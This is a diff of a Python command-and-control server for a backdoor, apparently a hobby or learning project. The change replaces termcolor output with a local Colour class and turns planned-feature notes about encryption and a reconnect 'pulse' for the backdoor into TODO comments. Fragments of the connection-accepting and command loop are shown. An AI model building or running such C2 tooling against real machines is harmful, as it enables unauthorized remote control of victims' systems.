@@ -1,10 +1,10 @@
 import socket
-import termcolor
 import json
 import os
 import threading
 
-from colour import banner
+# Local class imports
+from colour import banner, Colour
 
 
 def reliable_recv(target):
@@ -150,7 +150,9 @@ def accept_connections():
             target, ip = sock.accept()
             targets.append(target)
             ips.append(ip)
-            print(termcolor.colored(str(ip) + ' has connected!', 'green'))
+            # print(termcolor.colored(str(ip) + ' has connected!', 'green'))
+            print(Colour().green(str(ip) + " has connected!"))
+            print('[**] Command & Control Center: ', end="")
         except:
             pass
 
@@ -205,7 +207,8 @@ def c2():
             elif command[:4] == 'help':
                 c2_help_manual()
             else:
-                print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
+                # print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
+                print(Colour().red('[!!] Command Doesnt Exist'))
         except (KeyboardInterrupt, SystemExit):
             if input('\nDo you want to exit? yes/no: ') == 'yes':
                 break
@@ -235,10 +238,9 @@ sock.bind(('127.0.0.1', 5555))  # sudo fuser -k 5555/tcp
 sock.listen(5)
 t1 = threading.Thread(target=accept_connections)
 t1.start()
-# print(colour.Colour())
 print(banner())
 print('Run "help" command to see the usage manual')
-print(termcolor.colored('[+] Waiting For The Incoming Connections ...', 'green'))
+print(Colour().green('[+] Waiting For The Incoming Connections ...'))
 
 # c2()
 
@@ -291,25 +293,17 @@ while True:
         elif command[:4] == 'help':
             c2_help_manual()
         else:
-            print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
+            print(Colour().red('[!!] Command Doesnt Exist'))
     except (KeyboardInterrupt, SystemExit):
         if input('\nDo you want to exit? yes/no: ') == 'yes':
             sock.close()
-            print(termcolor.colored('\n[-] C2 Socket Closed! Bye!!', 'yellow'))
+            print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
             break
     except ValueError as e:
-        print(termcolor.colored('[!!] ValueError: ' + str(e), 'red'))
+        print(Colour().red('[!!] ValueError: ' + str(e)))
         continue
-
-"""
-Possibly improvements
-
--Consider encrypting the connection using custom (AES128-GCM-DH-SHA256) or HTTPS (lots of traffic w/ HTTP)
--Implement a 'pulse' feature between server and backdoor (Keep alive):
-
-This will ensure if server.py crashes the backdoor will after 60s will realise server is not listen on socket 
-and will attempt to run connection() function again.
-"""
 
 # TODO: encrypt connection
 # TODO: Implement a 'pulse' feature between server and backdoor (Keep alive)
+# This will ensure if server.py crashes the backdoor will after 60s will realise server is not listen on socket
+# and will attempt to run connection() function again.
